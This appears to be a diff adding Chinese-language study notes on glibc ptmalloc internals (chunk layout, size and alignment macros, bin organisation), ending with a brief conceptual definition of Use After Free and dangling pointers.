+- **size**: 该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍(32bit OS: 8B, 64bit OS: 16B)。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示
+  - NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。
+  - IS_MAPPED，记录当前 chunk 是否是由 **mmap** 分配的。
+  - **PREV_INUSE**，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 **1**，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 **0** 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。
+- **fd, bk**:  chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下
+  - fd 指向下一个（非物理相邻）空闲的 chunk
+  - bk 指向上一个（非物理相邻）空闲的 chunk
+  - 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理
+- **fd_nextsize, bk_nextsize**: 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。
+  - fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
+  - bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
+  - 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。**这样做可以避免在寻找合适 chunk 时挨个遍历**
+
+
+
+INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK:
+
+```cpp
+#ifndef INTERNAL_SIZE_T // INTERNAL_SIZE_T might be signed/unsigned, 32/64 bits, the same width as int/long
+# define INTERNAL_SIZE_T size_t // 默认与size_t一致，最好定义为unsigned，但size_t是signed
+#endif // 64bit OS中可能会被定义为32bit unsigned int, 除非需要16B alignments
+// size_t 可能与 INTERNAL_SIZE_T 位宽不等、有符号性不同 // int long 可能为32/64bit 也可能等位宽
+// 建议将INTERNAL_SIZE_T提升至unsigned long后作对比，但注意unsigned到更宽的long不是sign-extend
+#define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) // The corresponding word size.
+// 一般 SIZE_SZ = 4 in 32bit OS; 8 in 64bit OS
+#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) // The corresponding bit mask value.
+```
+
+> 一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数
+
+**称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。**
+
+```python
+# 一个已经分配的 chunk 的 mem layout
+chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # chunk header ↓
+        |             Size of previous chunk, if unallocated (P clear)  | 
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of chunk, in bytes                     |A|M|P| # 记录大小
+  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # chunk header ↑
+        |             User data starts here...                          . # user data
+        .                                                               . # user data...
+        .             (malloc_usable_size() bytes)                      .
+next    .                                                               |
+chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             (size of chunk, but used for application data)    |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of next chunk, in bytes                |A|0|1| # 1: 前一 chunk 块被分配
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```
+
+被释放的 chunk 被记录在链表中（可能是循环双向链表 / 单向链表）。具体结构如下
+
+```python
+# 被释放的 chunk 被记录在链表中（可能是循环双向链表 / 单向链表）。具体结构如下
+chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of previous chunk, if unallocated (P clear)  |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+`head:  |             Size of chunk, in bytes                     |A|0|P| # 0:
+  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Forward pointer to next chunk in list             |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Back pointer to previous chunk in list            |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Unused space (may be 0 bytes long)                .
+        .                                                               .
+ next   .                                                               |
+chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+`foot:  |             Size of chunk, in bytes                           |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of next chunk, in bytes                |A|0|0| # 0: 前一 chunk 块未被分配
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```
+
+可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小
+
+1. 本身的 size 字段会记录，
+2. 它后面的 chunk 会记录。
+
+**一般情况下**，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块
+
+```
+一些关于堆的约束:
+The three exceptions to all this are:
+     1. The special chunk `top' doesn't bother using the
+    trailing size field since there is no next contiguous chunk
+    that would have to index off it. After initialization, `top'
+    is forced to always exist.  If it would become less than
+    MINSIZE bytes long, it is replenished.
+     2. Chunks allocated via mmap, which have the second-lowest-order
+    bit M (IS_MMAPPED) set in their size fields.  Because they are
+    allocated one-by-one, each must contain its own trailing size
+    field.  If the M bit is set, the other bits are ignored
+    (because mmapped chunks are neither in an arena, nor adjacent
+    to a freed chunk).  The M bit is also used for chunks which
+    originally came from a dumped heap via malloc_set_state in
+    hooks.c.
+     3. Chunks in fastbins are treated as allocated chunks from the
+    point of view of the chunk allocator.  They are consolidated
+    with their neighbors only in bulk, in malloc_consolidate.
+```
+
+#### chunk MACRO
+
+ chunk 的大小、对齐检查以及一些转换的宏
+
+```c
+// mem 指向用户得到的内存的起始位置
+// conversion from malloc headers to user pointers, and back
+#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))
+#define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))
+```
+
+```c
+// 最小的 chunk 大小 The smallest possible chunk
+#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))
+```
+
+- offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针
+
+**最小申请的堆内存大小**: 用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍
+
+> **就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些**
+
+```c
+// The smallest size we can malloc is an aligned minimal chunk // 最小申请的堆内存大小
+// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
+#define MINSIZE                                                                \
+    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
+```
+
+**检查分配给用户的内存是否对齐** 2 * SIZE_SZ 大小对齐。
+
+```c
+// Check if m has acceptable alignment // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
+#define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0)
+
+#define misaligned_chunk(p)                                                    \
+    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &       \
+     MALLOC_ALIGN_MASK)
+```
+
+**请求字节数判断**
+
+```c
+//  Check if a request is so large that it would wrap around zero when
+//  padded and aligned. To simplify some other code, the bound is made
+//  low enough so that adding MINSIZE will also not wrap around zero.
+#define REQUEST_OUT_OF_RANGE(req)                                              \
+    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
+```
+
+**将用户请求内存大小转为实际分配内存大小**
+
+```c
+// pad request bytes into a usable size -- internal version
+// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 # SIZE_SZ: 4 in 32bit OS, 8 in 64bit OS
+#define request2size(req)                                                      \
+    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
+         ? MINSIZE                                                             \
+         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
+
+//  Same, except also perform argument check
+#define checked_request2size(req, sz)                                          \
+    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
+        __set_errno(ENOMEM);                                                   \
+        return 0;                                                              \
+    }                                                                          \
+    (sz) = request2size(req);
+```
+
+当一个 chunk 处于已分配状态时，它的**物理相邻的下一个 chunk 的 prev_size** 字段必然是**无效**的，故而这个字段就可以被当前这个 chunk 使用。这就是 ptmalloc 中 chunk 间的复用
+
+1. 首先，利用 REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求的字节大小的 chunk。
+2. 其次，需要注意的是用户请求的字节是用来存储数据的，即 chunk header 后面的部分。与此同时，由于 chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。
+3. 由于系统中所允许的申请的 chunk 最小是 MINSIZE，所以与其进行比较。如果不满足最低要求，那么就需要直接分配 **MINSIZE** 字节。
+4. 如果大于的话，因为系统中申请的 chunk 需要 **2 * SIZE_SZ** 对齐，所以这里需要加上 MALLOC_ALIGN_MASK 以便于对齐。
+
+
+
+### bin
+
+用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。
+
+ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。
+
+对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中:
+
+```c
+#define NBINS 128
+//  Normal bins packed as described above
+mchunkptr bins[ NBINS * 2 - 2 ];
+```
+
+`bins` 主要用于索引不同 bin 的 fd 和 bk。以 32 位系统为例，bins 前 4 项的含义如下
+
+| 含义      | bin1 fd / bin2 prev_size | bin1 bk / bin2 size | bin2 fd / bin3 prev_size | bin2 bk / bin3 size |
+| --------- | ------------------------ | ------------------- | ------------------------ | ------------------- |
+| bin index | 0                        | 1                   | 2                        | 3                   |
+
+bin2 prev_size与bin1 fd重合，bin2 size与bin1 bk重合。只使用fd, bk索引链表，故该重合部分记录的实际是bin1 fd, bk。也就是说，虽然后一个bin和前一个bin公用部分数据，但是其实记录的仍然是前一个bin的链表数据。通过这样复用节省空间。
+
+> fd 指向下一个（非物理相邻）空闲的 chunk，
+
+数组中的 bin 依次如下
+
+1. 第一个为 **unsorted bin**，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。
+2. 索引从 **2** 到 63 的 bin 称为 **small bin**，**同一个 small bin 链表中的 chunk 的大小相同**。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 **2 个机器字长**，即 32 位相差 8 字节，64 位相差 16 字节。
+3. small bins 后面的 bin 被称作 **large bins**。large bins 中的每一个 bin 都**包含一定范围内的 chunk**，其中的 chunk **按 fd 指针的顺序从大到小排列**。相同大小的 chunk 同样按照最近使用顺序排列。
+
+此外，上述这些 bin 的排布都会遵循一个原则：**任意两个物理相邻的空闲 chunk 不能在一起**
+
+并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk **先**放到 fast bins 的容器内。**而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。**
+
+bin 通用的宏如下
+
+```c
+typedef struct malloc_chunk *mbinptr;
+
+/* addressing -- note that bin_at(0) does not exist */
+#define bin_at(m, i)                                                           \
+    (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) -                        \
+              offsetof(struct malloc_chunk, fd))
+
+/* analog of ++bin */
+//获取下一个bin的地址
+#define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1)))
+
+/* Reminders about list directionality within bins */
+// 这两个宏可以用来遍历bin
+// 获取 bin 的位于链表头的 chunk
+#define first(b) ((b)->fd)
+// 获取 bin 的位于链表尾的 chunk
+#define last(b) ((b)->bk)
+```
+
+
+
+
+
+
+
+
+
+### Use After Free
+
+> Use After Free, UAF问题 
+
+当一个内存块被释放之后再次被使用，有以下几种情况：
+
+- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，程序崩溃。
+- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
+- 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。
+
+一般所指的 **Use After Free** 漏洞主要是后两种。一般称被释放后没有被设置为NULL的内存指针为**dangling pointer**。
+
+
+
+
 
 
 
